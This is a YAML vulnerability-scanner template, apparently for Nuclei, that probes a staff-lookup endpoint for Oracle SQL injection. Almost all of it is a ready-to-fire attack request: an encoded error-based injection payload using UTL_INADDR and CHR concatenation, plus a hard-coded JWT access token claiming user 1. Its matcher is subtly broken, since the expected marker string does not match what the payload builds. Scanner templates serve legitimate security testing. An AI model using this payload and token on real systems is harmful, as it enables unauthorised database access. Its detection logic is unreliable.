content:
id: oracle-sql-injection

info:
  name: Oracle SQL Injection
  author: 无垢
  severity: high
  description: |
    This template detects an Oracle SQL Injection vulnerability in the application.

http:
  - raw:
      - |
        GET /ncchr/pm/staff/queryStaffByName?name=1%27+AND+7216%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%287216%3D7216%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28118%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29--+hzDZ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Accesstokenncc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "7216"      # Ensure the injected value is reflected back

      - type: regex
        regex:
          - "qkpqjkqjvqbq"  # Check for specific pattern in response
help: This template detects an Oracle SQL Injection vulnerability in the application.
author: 无垢
